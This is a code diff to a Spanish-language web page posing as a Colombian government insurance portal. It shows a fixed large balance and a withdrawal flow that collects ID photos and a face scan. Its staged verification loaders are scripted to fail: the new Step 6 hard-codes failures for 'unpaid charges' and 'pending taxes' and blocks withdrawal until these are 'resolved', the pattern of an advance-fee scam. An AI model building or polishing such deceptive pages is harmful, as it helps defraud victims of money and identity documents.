@@ -146,7 +146,7 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
 .btn-action { width: 100%; padding: 15px; background: linear-gradient(135deg, var(--gold), var(--gold-light)); color: var(--navy-dark); font-size: 15px; font-weight: 700; border: none; border-radius: 12px; cursor: pointer; transition: all 0.25s; box-shadow: 0 6px 20px rgba(245,197,24,0.3); margin-top: 8px; font-family: 'DM Sans', sans-serif; }
 .btn-action:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
 .btn-action:not(:disabled):hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(245,197,24,0.5); }
-.login-links { display: flex; justify-content: space-between; margin-top: 20px; }
+.login-links { display: flex; justify-content: space-between; margin-top: 20px; flex-wrap: wrap; gap: 8px; }
 .login-links a { color: rgba(255,255,255,0.45); font-size: 13px; text-decoration: none; cursor: pointer; transition: color 0.2s; }
 .login-links a:hover { color: var(--gold); }
 .error-msg { background: rgba(192,0,30,0.15); border: 1px solid rgba(192,0,30,0.3); color: #ff6b6b; font-size: 13px; padding: 12px 16px; border-radius: 10px; margin-top: 14px; display: none; }
@@ -403,7 +403,7 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
 .wf-continue:not(:disabled):hover { background: var(--navy); transform: translateY(-1px); box-shadow: 0 8px 24px rgba(0,20,74,0.22); }
 
 /* =====================================================
-   STEP 5 — PREMIUM VERIFICATION LOADER
+   STEP 5 — PREMIUM VERIFICATION LOADER (UNCHANGED)
 ===================================================== */
 #wfs-5 {
   display: none;
@@ -417,7 +417,6 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
   display: flex;
 }
 
-/* Circular progress ring */
 .vl-ring-wrap {
   position: relative;
   width: 180px;
@@ -468,7 +467,6 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
   margin-top: 2px;
 }
 
-/* Scrolling status messages */
 .vl-status-wrap {
   width: 100%;
   max-width: 340px;
@@ -501,7 +499,6 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
   opacity: 1;
 }
 
-/* Step indicators under the loader */
 .vl-checks {
   display: flex;
   flex-direction: column;
@@ -542,7 +539,6 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
 .vl-check-text { font-size: 13px; font-weight: 500; color: #374151; }
 .vl-check-sub { font-size: 11px; color: #9ca3af; margin-top: 1px; }
 
-/* --- 99% stall state --- */
 .vl-stall-msg {
   display: none;
   flex-direction: column;
@@ -568,7 +564,7 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
   font-size: 13px; color: #6b7280;
 }
 
-/* FINAL RESULT SCREEN */
+/* FINAL RESULT SCREEN (UNCHANGED) */
 .vl-result-screen {
   display: none;
   flex-direction: column;
@@ -651,7 +647,369 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
   box-shadow: 0 10px 32px rgba(13,27,62,0.35);
 }
 
-/* RESPONSIVE */
+/* =====================================================
+   STEP 6 — WITHDRAWAL VERIFICATION MODULE (NEW)
+===================================================== */
+#wfs-6 {
+  display: none;
+  flex-direction: column;
+  align-items: stretch;
+  padding: 4px 0 40px;
+  min-height: 500px;
+  animation: wf-slide 0.32s cubic-bezier(.22,.68,0,1.2) both;
+}
+#wfs-6.active {
+  display: flex;
+}
+
+/* Dot ring loader */
+.s6-loader-phase {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 32px 0 36px;
+}
+.s6-dot-ring {
+  position: relative;
+  width: 88px;
+  height: 88px;
+  margin-bottom: 22px;
+  flex-shrink: 0;
+}
+.s6-dot-ring span {
+  position: absolute;
+  width: 9px;
+  height: 9px;
+  border-radius: 50%;
+  background: #00144a;
+  left: 50%;
+  top: 50%;
+  margin-left: -4.5px;
+  margin-top: -4.5px;
+  animation: s6DotPulse 1.3s ease-in-out infinite;
+  will-change: opacity, transform;
+  animation-fill-mode: none;
+}
+.s6-dot-ring span:nth-child(1)  { transform: translateY(-38px);                                animation-delay: 0s;      }
+.s6-dot-ring span:nth-child(2)  { transform: rotate(30deg)  translateY(-38px) rotate(-30deg);  animation-delay: 0.108s;  }
+.s6-dot-ring span:nth-child(3)  { transform: rotate(60deg)  translateY(-38px) rotate(-60deg);  animation-delay: 0.217s;  }
+.s6-dot-ring span:nth-child(4)  { transform: rotate(90deg)  translateY(-38px) rotate(-90deg);  animation-delay: 0.325s;  }
+.s6-dot-ring span:nth-child(5)  { transform: rotate(120deg) translateY(-38px) rotate(-120deg); animation-delay: 0.433s;  }
+.s6-dot-ring span:nth-child(6)  { transform: rotate(150deg) translateY(-38px) rotate(-150deg); animation-delay: 0.542s;  }
+.s6-dot-ring span:nth-child(7)  { transform: rotate(180deg) translateY(-38px) rotate(-180deg); animation-delay: 0.650s;  }
+.s6-dot-ring span:nth-child(8)  { transform: rotate(210deg) translateY(-38px) rotate(-210deg); animation-delay: 0.758s;  }
+.s6-dot-ring span:nth-child(9)  { transform: rotate(240deg) translateY(-38px) rotate(-240deg); animation-delay: 0.867s;  }
+.s6-dot-ring span:nth-child(10) { transform: rotate(270deg) translateY(-38px) rotate(-270deg); animation-delay: 0.975s;  }
+.s6-dot-ring span:nth-child(11) { transform: rotate(300deg) translateY(-38px) rotate(-300deg); animation-delay: 1.083s;  }
+.s6-dot-ring span:nth-child(12) { transform: rotate(330deg) translateY(-38px) rotate(-330deg); animation-delay: 1.192s;  }
+
+@keyframes s6DotPulse {
+  0%, 100% { opacity: 0.15; transform: var(--dt, translateY(-38px)) scale(0.65); }
+  50%       { opacity: 1;    transform: var(--dt, translateY(-38px)) scale(1.2);  }
+}
+
+/* Override: each dot keeps its own translate via inline style set by JS */
+.s6-dot-ring span { --dt: translateY(-38px); }
+
+/* Revalidation shimmer overlay on dot ring during transition */
+.s6-dot-ring.revalidating span {
+  animation: s6DotPulse 0.6s ease-in-out infinite !important;
+}
+.s6-dot-ring.revalidating {
+  filter: drop-shadow(0 0 8px rgba(0, 20, 74, 0.45));
+}
+
+/* Next button for Step 6 */
+.s6-next-btn {
+  width: 100%;
+  padding: 15px;
+  background: var(--navy-dark);
+  color: #ffffff;
+  font-size: 15px;
+  font-weight: 600;
+  border: none;
+  border-radius: 13px;
+  cursor: pointer;
+  font-family: 'DM Sans', sans-serif;
+  transition: all 0.3s ease;
+  margin-top: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  letter-spacing: 0.1px;
+  position: relative;
+  overflow: hidden;
+}
+.s6-next-btn:disabled {
+  opacity: 0.28;
+  cursor: not-allowed;
+  transform: none !important;
+  box-shadow: none !important;
+}
+.s6-next-btn:not(:disabled) {
+  animation: s6NextReady 0.5s cubic-bezier(.22,.68,0,1.2) both;
+}
+@keyframes s6NextReady {
+  from { opacity: 0.28; transform: translateY(6px); }
+  to   { opacity: 1;    transform: translateY(0); }
+}
+.s6-next-btn:not(:disabled):hover {
+  background: var(--navy);
+  transform: translateY(-2px);
+  box-shadow: 0 8px 24px rgba(0,20,74,0.28);
+}
+.s6-next-btn.processing {
+  opacity: 0.7;
+  cursor: wait;
+  pointer-events: none;
+}
+.s6-next-btn.processing::after {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(90deg, transparent 0%, rgba(245,197,24,0.18) 50%, transparent 100%);
+  animation: s6BtnSweep 1.2s ease-in-out infinite;
+}
+@keyframes s6BtnSweep {
+  from { transform: translateX(-100%); }
+  to   { transform: translateX(100%); }
+}
+
+/* Revalidation transition overlay */
+.s6-revalidation-bar {
+  display: none;
+  flex-direction: column;
+  gap: 7px;
+  animation: s6FadeUp 0.4s ease both;
+  margin-top: 10px;
+}
+.s6-revalidation-bar.show { display: flex; }
+.s6-reval-label {
+  display: flex; justify-content: space-between;
+  font-size: 12px; color: #6b7280; margin-bottom: 4px;
+}
+.s6-reval-track {
+  height: 3px; background: #e5e8ef; border-radius: 4px; overflow: hidden;
+}
+.s6-reval-fill {
+  height: 100%; width: 0;
+  background: linear-gradient(90deg, #001f5b, #f5c518, #001f5b);
+  background-size: 200% 100%;
+  border-radius: 4px;
+  transition: width 0.4s ease;
+  animation: s6RevalShimmer 1.5s linear infinite;
+}
+@keyframes s6RevalShimmer {
+  from { background-position: 200% 0; }
+  to   { background-position: -200% 0; }
+}
+
+/* Block message for unresolved issues */
+.s6-block-msg {
+  display: none;
+  background: #fff5f5;
+  border: 1.5px solid #fecaca;
+  border-radius: 16px;
+  padding: 20px 20px 18px;
+  margin-top: 14px;
+  animation: s6FadeUp 0.45s cubic-bezier(.22,.68,0,1.1) both;
+}
+.s6-block-msg.show { display: block; }
+.s6-block-header {
+  display: flex; align-items: center; gap: 10px;
+  margin-bottom: 10px;
+}
+.s6-block-icon {
+  width: 34px; height: 34px; border-radius: 50%;
+  background: #fef2f2; border: 1.5px solid #fecaca;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px; color: #dc2626; flex-shrink: 0;
+}
+.s6-block-title {
+  font-size: 14px; font-weight: 700; color: #dc2626;
+}
+.s6-block-body {
+  font-size: 13px; color: #374151; line-height: 1.7;
+}
+.s6-block-action {
+  display: inline-flex; align-items: center; gap: 6px;
+  margin-top: 12px; font-size: 12px; font-weight: 700;
+  color: #dc2626; letter-spacing: 0.5px; text-transform: uppercase;
+  background: #fef2f2; border: 1px solid #fecaca;
+  padding: 6px 14px; border-radius: 100px;
+}
+
+.s6-loader-title {
+  font-size: 15px; font-weight: 600; color: #111827;
+  margin-bottom: 5px; text-align: center; line-height: 1.4;
+}
+.s6-loader-sub {
+  font-size: 12px; color: #9ca3af;
+  text-align: center; line-height: 1.6;
+}
+
+/* Assurance banners */
+.s6-banner {
+  background: #ffffff;
+  border: 1px solid #e5e8ef;
+  border-radius: 18px;
+  padding: 20px 22px 18px;
+  margin-bottom: 14px;
+  box-shadow: 0 2px 12px rgba(0,20,74,0.05);
+  display: none;
+  animation: s6FadeUp 0.45s cubic-bezier(.22,.68,0,1.1) both;
+}
+@keyframes s6FadeUp {
+  from { opacity:0; transform: translateY(14px); }
+  to   { opacity:1; transform: translateY(0); }
+}
+.s6-banner-header {
+  display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px;
+}
+.s6-banner-icon {
+  width: 36px; height: 36px; border-radius: 10px;
+  background: rgba(0,20,74,0.07);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 15px; color: #00144a; flex-shrink: 0; margin-top: 2px;
+}
+.s6-banner-title {
+  font-size: 14px; font-weight: 600; color: #111827; line-height: 1.3; margin-bottom: 2px;
+}
+.s6-banner-desc  {
+  font-size: 11px; color: #6b7280; line-height: 1.4;
+}
+.s6-banner-body  {
+  font-size: 13px; color: #374151; line-height: 1.75;
+}
+
+/* Verification checks section */
+.s6-checks-wrap {
+  display: none;
+  flex-direction: column;
+  gap: 9px;
+  animation: s6FadeUp 0.4s ease both;
+  margin-bottom: 14px;
+}
+.s6-checks-label {
+  font-size: 10px; font-weight: 700; letter-spacing: 1.4px;
+  text-transform: uppercase; color: #9ca3af;
+  margin-bottom: 4px; padding-left: 2px;
+}
+.s6-check-item {
+  background: #ffffff;
+  border: 1px solid #f0f2f6;
+  border-radius: 14px;
+  padding: 13px 16px;
+  display: flex; align-items: flex-start; gap: 13px;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.03);
+  opacity: 0;
+  transform: translateY(10px);
+  transition: all 0.42s cubic-bezier(.22,.68,0,1.1);
+}
+.s6-check-item.visible { opacity: 1; transform: translateY(0); }
+
+/* Badge icon — default pending */
+.s6-check-num {
+  width: 28px; height: 28px; border-radius: 50%;
+  background: #f3f4f6; border: 1px solid #e5e7eb;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-weight: 700; color: #9ca3af;
+  flex-shrink: 0; margin-top: 1px;
+  transition: all 0.35s ease;
+}
+.s6-check-num.spin {
+  background: #eff6ff; color: #2563eb; border-color: #bfdbfe;
+  animation: s6Spin 0.9s linear infinite;
+}
+.s6-check-num.done {
+  background: #ecfdf5; color: #059669; border-color: #a7f3d0;
+  animation: none;
+}
+/* FAILED state — for charge-related items */
+.s6-check-num.fail {
+  background: #fef2f2; color: #dc2626; border-color: #fecaca;
+  animation: none;
+}
+.s6-check-item.fail-row {
+  border-color: #fee2e2;
+  background: #fff9f9;
+}
+@keyframes s6Spin { to { transform: rotate(360deg); } }
+
+.s6-check-text { font-size: 13px; font-weight: 600; color: #111827; line-height: 1.3; }
+.s6-check-sub  { font-size: 12px; color: #6b7280; line-height: 1.5; margin-top: 3px; }
+.s6-fail-tag {
+  display: inline-flex; align-items: center; gap: 4px;
+  background: #fef2f2; color: #dc2626;
+  font-size: 10px; font-weight: 700; letter-spacing: 0.8px;
+  text-transform: uppercase; padding: 2px 8px; border-radius: 100px;
+  margin-top: 5px; border: 1px solid #fecaca;
+}
+
+/* Guarantee block */
+.s6-guarantee {
+  display: none;
+  background: linear-gradient(135deg, #00144a 0%, #001f5b 100%);
+  border-radius: 18px;
+  padding: 22px 22px 20px;
+  margin-bottom: 14px;
+  color: #fff;
+  animation: s6FadeUp 0.5s ease both;
+  position: relative; overflow: hidden;
+}
+.s6-guarantee::before {
+  content: '';
+  position: absolute; top: -40px; right: -40px;
+  width: 130px; height: 130px; border-radius: 50%;
+  background: rgba(245,197,24,0.08);
+  pointer-events: none;
+}
+.s6-guarantee-badge {
+  display: inline-flex; align-items: center; gap: 7px;
+  background: rgba(245,197,24,0.15);
+  border: 1px solid rgba(245,197,24,0.3);
+  color: #f5c518; font-size: 11px; font-weight: 600;
+  letter-spacing: 1px; text-transform: uppercase;
+  padding: 4px 12px; border-radius: 100px;
+  margin-bottom: 12px;
+}
+.s6-guarantee-badge::before {
+  content: ''; width: 6px; height: 6px;
+  border-radius: 50%; background: #f5c518;
+}
+.s6-guarantee-title {
+  font-family: 'Playfair Display', serif;
+  font-size: 17px; font-weight: 700; color: #fff;
+  margin-bottom: 8px; line-height: 1.3;
+}
+.s6-guarantee-body {
+  font-size: 13px; color: rgba(255,255,255,0.7); line-height: 1.7;
+}
+
+/* Processing bar */
+.s6-proc-bar-wrap {
+  display: none;
+  animation: s6FadeUp 0.4s ease both;
+  margin-bottom: 8px;
+}
+.s6-proc-label {
+  display: flex; justify-content: space-between;
+  font-size: 12px; color: #9ca3af; margin-bottom: 8px;
+}
+.s6-proc-track {
+  height: 4px; background: #e5e8ef; border-radius: 4px; overflow: hidden;
+}
+.s6-proc-fill {
+  height: 100%; width: 0;
+  background: linear-gradient(90deg, #00144a, #f5c518);
+  border-radius: 4px;
+  transition: width 0.5s ease;
+}
+
+/* =====================================================
+   RESPONSIVE — UNIFIED
+===================================================== */
 @media (max-width: 900px) {
   .dash-grid { grid-template-columns: 1fr; }
   .features-grid, .testimonials-grid { grid-template-columns: 1fr; }
@@ -687,6 +1045,12 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
   .wf-progress-bar-wrap { padding: 0 16px; }
   .wf-body { padding: 24px 16px 60px; }
   .wf-upload-grid { grid-template-columns: 1fr; }
+  /* Step 6 responsive */
+  .s6-banner { padding: 16px 16px 14px; border-radius: 14px; }
+  .s6-guarantee { padding: 18px 16px 16px; border-radius: 14px; }
+  .s6-check-item { padding: 12px 14px; }
+  .s6-loader-phase { padding: 24px 0 28px; }
+  .s6-dot-ring { width: 76px; height: 76px; }
 }
 @media (max-width: 480px) {
   .stats-grid { grid-template-columns: 1fr; }
@@ -694,6 +1058,15 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
   .footer-bottom { flex-direction: column; text-align: center; }
   .register-box { padding: 28px 18px; }
   .step-btns { flex-direction: column; }
+  .wf-heading h2 { font-size: 18px; }
+  .s6-check-text { font-size: 12px; }
+  .s6-check-sub  { font-size: 11px; }
+  .s6-banner-title { font-size: 13px; }
+  .s6-banner-body  { font-size: 12px; }
+  .s6-guarantee-title { font-size: 16px; }
+  .vl-pct { font-size: 32px; }
+  .face-ring-outer { width: 160px; height: 160px; }
+  .face-circle { width: 160px; height: 160px; }
 }
 </style>
 </head>
@@ -885,10 +1258,9 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
       <button class="wf-continue" id="wfc-4" disabled onclick="wfNext(5)">Continuar <i class="fas fa-arrow-right" style="font-size:13px;"></i></button>
     </div>
 
-    <!-- STEP 5: Premium Verification Loader -->
+    <!-- STEP 5: Premium Verification Loader (UNCHANGED) -->
     <div class="wf-step" id="wfs-5">
 
-      <!-- Ring + percentage -->
       <div class="vl-ring-wrap" id="vl-ring-wrap">
         <svg class="vl-svg" viewBox="0 0 180 180">
           <defs>
@@ -906,21 +1278,16 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
         </div>
       </div>
 
-      <!-- Scrolling status messages -->
       <div class="vl-status-wrap" id="vl-status-wrap">
-        <div class="vl-status-track" id="vl-status-track">
-          <!-- items injected by JS -->
-        </div>
+        <div class="vl-status-track" id="vl-status-track"></div>
       </div>
 
-      <!-- Stall message at 99% -->
       <div class="vl-stall-msg" id="vl-stall-msg">
         <div class="vl-cancel-icon"><i class="fas fa-xmark"></i></div>
         <div class="vl-stall-title">Verificación detenida</div>
         <div class="vl-stall-sub">No se pudo completar la validación</div>
       </div>
 
-      <!-- Mini check rows (shown during loading) -->
       <div class="vl-checks" id="vl-checks">
         <div class="vl-check-row">
           <div class="vl-check-icon" id="vlc-1"><i class="fas fa-clock"></i></div>
@@ -945,7 +1312,7 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
         </div>
       </div>
 
-      <!-- Final result screen (hidden until 99% stall) -->
+      <!-- Final result screen (UNCHANGED — last step, DO NOT TOUCH) -->
       <div class="vl-result-screen" id="vl-result-screen">
         <div class="vl-result-badge"><i class="fas fa-xmark"></i></div>
         <div class="vl-result-title">Retiro No Aprobado</div>
@@ -965,8 +1332,178 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
       </div>
 
     </div>
-  </div>
-</div>
+
+    <!-- =====================================================
+         STEP 6 — WITHDRAWAL VERIFICATION MODULE (NEW)
+    ===================================================== -->
+    <div class="wf-step" id="wfs-6">
+
+      <!-- PHASE A: Dot ring loader -->
+      <div class="s6-loader-phase" id="s6-loader">
+        <div class="s6-dot-ring" id="s6-dot-ring" aria-label="Procesando">
+          <span></span><span></span><span></span><span></span>
+          <span></span><span></span><span></span><span></span>
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <div class="s6-loader-title">Iniciando análisis avanzado…</div>
+        <div class="s6-loader-sub">Ejecutando verificación completa de retiro</div>
+      </div>
+
+      <!-- PHASE B: Assurance banners -->
+      <div class="s6-banner" id="s6-b1">
+        <div class="s6-banner-header">
+          <div class="s6-banner-icon"><i class="fas fa-shield-halved"></i></div>
+          <div>
+            <div class="s6-banner-title">Garantía Maestra del Proceso</div>
+            <div class="s6-banner-desc">Compromiso de revisión completa y transparente</div>
+          </div>
+        </div>
+        <div class="s6-banner-body">Este proceso garantiza una revisión completa, transparente y segura de su solicitud de retiro. El objetivo es identificar cualquier problema, validar todos los requisitos pendientes y asegurar que los fondos sean procesados correctamente en el menor tiempo posible.</div>
+      </div>
+
+      <div class="s6-banner" id="s6-b2">
+        <div class="s6-banner-header">
+          <div class="s6-banner-icon"><i class="fas fa-gears"></i></div>
+          <div>
+            <div class="s6-banner-title">Seguridad del Proceso</div>
+            <div class="s6-banner-desc">Lógica de validación del sistema central</div>
+          </div>
+        </div>
+        <div class="s6-banner-body">Se realizará una verificación exhaustiva en cada etapa del proceso de retiro, incluyendo validaciones internas, revisión de cargos y comprobaciones del estado de la transacción. Cualquier problema detectado será tratado de inmediato para garantizar la liberación exitosa de los fondos.</div>
+      </div>
+
+      <div class="s6-banner" id="s6-b3">
+        <div class="s6-banner-header">
+          <div class="s6-banner-icon"><i class="fas fa-bolt"></i></div>
+          <div>
+            <div class="s6-banner-title">Compromiso de Urgencia y Resolución</div>
+            <div class="s6-banner-desc">Atención prioritaria de su caso</div>
+          </div>
+        </div>
+        <div class="s6-banner-body">Este caso será tratado con prioridad. Se tomarán todas las acciones necesarias para resolver retrasos, completar los requisitos pendientes y garantizar que el retiro sea procesado sin más interrupciones.</div>
+      </div>
+
+      <!-- PHASE C: 7-Point verification module -->
+      <div class="s6-checks-wrap" id="s6-checks">
+        <div class="s6-checks-label">Módulo de verificación de retiro</div>
+
+        <!-- 1 — Transaction status (passes) -->
+        <div class="s6-check-item" id="s6c-1">
+          <div class="s6-check-num" id="s6n-1">1</div>
+          <div>
+            <div class="s6-check-text">Estado de transacción hacia Bancolombia</div>
+            <div class="s6-check-sub">Verificando por qué el retiro no está siendo procesado — revisando restricciones y bloqueadores activos</div>
+          </div>
+        </div>
+
+        <!-- 2 — Timeline analysis (passes) -->
+        <div class="s6-check-item" id="s6c-2">
+          <div class="s6-check-num" id="s6n-2">2</div>
+          <div>
+            <div class="s6-check-text">Análisis de cronograma esperado</div>
+            <div class="s6-check-sub">Determinando por qué el retiro debería haberse iniciado según los plazos previstos — identificando demoras</div>
+          </div>
+        </div>
+
+        <!-- 3 — Incomplete charges (FAILS) -->
+        <div class="s6-check-item" id="s6c-3">
+          <div class="s6-check-num" id="s6n-3">3</div>
+          <div>
+            <div class="s6-check-text">Revisión de cargos incompletos</div>
+            <div class="s6-check-sub">Identificando y explicando errores relacionados con cargos pendientes que afectan el proceso de retiro</div>
+            <div class="s6-fail-tag" id="s6-fail-tag-3" style="display:none;"><i class="fas fa-xmark" style="font-size:9px;"></i> Cargos impagos detectados</div>
+          </div>
+        </div>
+
+        <!-- 4 — Escalation report (passes) -->
+        <div class="s6-check-item" id="s6c-4">
+          <div class="s6-check-num" id="s6n-4">4</div>
+          <div>
+            <div class="s6-check-text">Generación de reporte de escalación</div>
+            <div class="s6-check-sub">Preparando informe completo para la agencia correspondiente con datos de transacción y detalles del error</div>
+          </div>
+        </div>
+
+        <!-- 5 — System errors (FAILS) -->
+        <div class="s6-check-item" id="s6c-5">
+          <div class="s6-check-num" id="s6n-5">5</div>
+          <div>
+            <div class="s6-check-text">Detección de errores del sistema</div>
+            <div class="s6-check-sub">Detectando errores a nivel de sistema que afectan el retiro y evaluando posibles resoluciones</div>
+            <div class="s6-fail-tag" id="s6-fail-tag-5" style="display:none;"><i class="fas fa-xmark" style="font-size:9px;"></i> Error de integración confirmado</div>
+          </div>
+        </div>
+
+        <!-- 6 — Unpaid charges (FAILS) -->
+        <div class="s6-check-item" id="s6c-6">
+          <div class="s6-check-num" id="s6n-6">6</div>
+          <div>
+            <div class="s6-check-text">Confirmación de cargos impagos</div>
+            <div class="s6-check-sub">Confirmando si cargos pendientes están bloqueando el retiro — especificando pasos requeridos para resolver</div>
+            <div class="s6-fail-tag" id="s6-fail-tag-6" style="display:none;"><i class="fas fa-xmark" style="font-size:9px;"></i> Impuestos pendientes sin liquidar</div>
+          </div>
+        </div>
+
+        <!-- 7 — Deep escalation (passes) -->
+        <div class="s6-check-item" id="s6c-7">
+          <div class="s6-check-num" id="s6n-7">7</div>
+          <div>
+            <div class="s6-check-text">Escalación para análisis profundo</div>
+            <div class="s6-check-sub">Escalando el caso con todos los datos relevantes de transacción y problemas detectados</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- PHASE D: Final guarantee -->
+      <div class="s6-guarantee" id="s6-guarantee">
+        <div class="s6-guarantee-badge">Garantía Final</div>
+        <div class="s6-guarantee-title">Procesamiento Garantizado</div>
+        <div class="s6-guarantee-body">Una vez completadas todas las verificaciones y requisitos, el retiro será procesado exitosamente a la cuenta bancaria designada sin demoras adicionales.</div>
+      </div>
+
+      <!-- PHASE E: Processing bar -->
+      <div class="s6-proc-bar-wrap" id="s6-procbar">
+        <div class="s6-proc-label">
+          <span>Finalizando análisis completo…</span>
+          <span id="s6-pct">0%</span>
+        </div>
+        <div class="s6-proc-track"><div class="s6-proc-fill" id="s6-fill"></div></div>
+      </div>
+
+      <!-- PHASE F: Revalidation transition bar (shown when Next is clicked) -->
+      <div class="s6-revalidation-bar" id="s6-reval-bar">
+        <div class="s6-reval-label">
+          <span id="s6-reval-text">Re-validando análisis final…</span>
+          <span id="s6-reval-pct">0%</span>
+        </div>
+        <div class="s6-reval-track"><div class="s6-reval-fill" id="s6-reval-fill"></div></div>
+      </div>
+
+      <!-- BLOCK MESSAGE: shown if unresolved issues prevent progression -->
+          <div class="s6-block-header">
+          <div class="s6-block-icon"><i class="fas fa-triangle-exclamation"></i></div>
+          <div class="s6-block-title">Progresión Bloqueada</div>
+        </div>
+        <div class="s6-block-body">
+          Se han detectado <strong>cargos pendientes sin liquidar</strong> que impiden continuar con el análisis final. Antes de proceder, debe resolver los siguientes problemas:
+          <br><br>
+          • Cargos impagos detectados en la revisión de integración<br>
+          • Error de integración confirmado en el sistema bancario<br>
+          • Impuestos pendientes sin liquidar
+        </div>
+        <div class="s6-block-action"><i class="fas fa-lock" style="font-size:10px;"></i> Acción requerida para continuar</div>
+      </div>
+
+      <!-- NEXT BUTTON -->
+      <button class="s6-next-btn" id="s6-next-btn" disabled onclick="s6HandleNext()">
+        Continuar al Análisis Final <i class="fas fa-arrow-right" style="font-size:13px;"></i>
+      </button>
+
+    </div>
+    <!-- END STEP 6 -->
+
+  </div><!-- end .wf-body -->
+</div><!-- end #withdraw-flow -->
 
 <!-- PAGE: HOME -->
 <div id="page-home" class="page active">
@@ -1165,7 +1702,7 @@ body { font-family: 'DM Sans', sans-serif; background: var(--offwhite); color: v
         <div class="inner-page" style="max-width:700px;">
           <h2>Mi Perfil Completo</h2><p class="sub">Información de su cuenta de seguro gubernamental</p>
           <div class="white-card">
-            <div style="display:flex;align-items:center;gap:20px;margin-bottom:28px;padding-bottom:24px;border-bottom:1px solid var(--gray-light);">
+            <div style="display:flex;align-items:center;gap:20px;margin-bottom:28px;padding-bottom:24px;border-bottom:1px solid var(--gray-light);flex-wrap:wrap;">
               <div class="profile-page-avatar"><img src="https://colombia-kappa.vercel.app/user.jpg" alt="User" /></div>
               <div><div style="font-size:22px;font-weight:700;color:var(--navy-dark);">Cecilia Moncaleano Chilatra</div><div class="verified-badge" style="margin-top:6px;"><i class="fas fa-check"></i> Cuenta Verificada</div></div>
             </div>
@@ -1278,25 +1815,19 @@ function sendMsg() { document.getElementById('msg-success').style.display='block
 
 // BALANCE (STATIC)
 var balanceNum = 104300000;
-
 function updateBalanceDisplay() {
   var el = document.getElementById('live-balance');
-  if (el) {
-    el.textContent = balanceNum.toLocaleString('es-CO');
-  }
+  if (el) el.textContent = balanceNum.toLocaleString('es-CO');
 }
-
-// Run once
 updateBalanceDisplay();
+function startBalanceGrowth() { updateBalanceDisplay(); }
 
-
-// STATS (you can keep this if you still want animation)
+// STATS
 function animateStats() {
   document.querySelectorAll('[data-target]').forEach(function(el){
     var t = parseInt(el.dataset.target);
     var c = 0;
     var s = t / 50;
-
     var iv = setInterval(function(){
       c = Math.min(c + s, t);
       el.textContent = Math.floor(c);
@@ -1327,10 +1858,11 @@ function closeWithdrawFlow() {
   stopCamera();
   wfTimers.forEach(function(t){clearTimeout(t);}); wfTimers = [];
   stopVerificationLoader();
+  stopStep6();
 }
 
 function resetWFUI() {
-  for(var i=0;i<=5;i++){var s=document.getElementById('wfs-'+i);if(s)s.classList.remove('active');}
+  for(var i=0;i<=6;i++){var s=document.getElementById('wfs-'+i);if(s)s.classList.remove('active');}
   document.getElementById('wfs-0').classList.add('active');
   document.getElementById('wf-prog-wrap').style.display='none';
   ['ucard-front','ucard-back','ucard-addr'].forEach(function(id){var c=document.getElementById(id);if(c)c.classList.remove('done');});
@@ -1347,8 +1879,8 @@ function resetWFUI() {
   document.getElementById('face-sub').textContent='Siga las instrucciones para verificar su identidad';
   var vid=document.getElementById('face-video'); vid.srcObject=null; vid.style.display='none';
   document.getElementById('face-placeholder').style.display='flex';
-  // Reset verification loader
   resetVerificationLoader();
+  resetStep6();
   document.getElementById('wd-amount').value = '10000';
   document.getElementById('wd-summary').textContent = '$10,000 COP';
   document.getElementById('wd-amount-err').style.display='none';
@@ -1463,13 +1995,13 @@ function stopCamera() {
 }
 
 // ================================================================
-// PREMIUM VERIFICATION LOADER — STEP 5
+// STEP 5 — PREMIUM VERIFICATION LOADER (UNCHANGED)
 // ================================================================
 var vlInterval = null;
 var vlStatusInterval = null;
 var vlCurrentPct = 0;
 var vlStalled = false;
-var vlCircumference = 2 * Math.PI * 80; // 502.65
+var vlCircumference = 2 * Math.PI * 80;
 
 var VL_MESSAGES = [
   'Ejecutando controles de seguridad…',
@@ -1500,24 +2032,16 @@ function resetVerificationLoader() {
   vlCurrentPct = 0;
   vlStalled = false;
   vlMsgIndex = 0;
-
   var arc = document.getElementById('vl-arc');
   if(arc) arc.style.strokeDashoffset = vlCircumference;
-
   var pct = document.getElementById('vl-pct');
   if(pct) pct.textContent = '0';
-
-  // Clear status track
   var track = document.getElementById('vl-status-track');
   if(track) track.innerHTML = '';
-
-  // Reset check icons
   ['vlc-1','vlc-2','vlc-3'].forEach(function(id){
     var el = document.getElementById(id);
     if(el){ el.className='vl-check-icon'; el.innerHTML='<i class="fas fa-clock"></i>'; }
   });
-
-  // Show checks, hide stall and result
   var checks = document.getElementById('vl-checks');
   if(checks) checks.style.display='flex';
   var stall = document.getElementById('vl-stall-msg');
@@ -1548,22 +2072,13 @@ function setVLCheckState(id, state) {
 function vlAddStatusMessage(text) {
   var track = document.getElementById('vl-status-track');
   if(!track) return;
-
-  // Fade out current visible item
-  if(vlMsgCurrentVisible) {
-    vlMsgCurrentVisible.classList.remove('vl-visible');
-  }
-
+  if(vlMsgCurrentVisible) vlMsgCurrentVisible.classList.remove('vl-visible');
   var item = document.createElement('div');
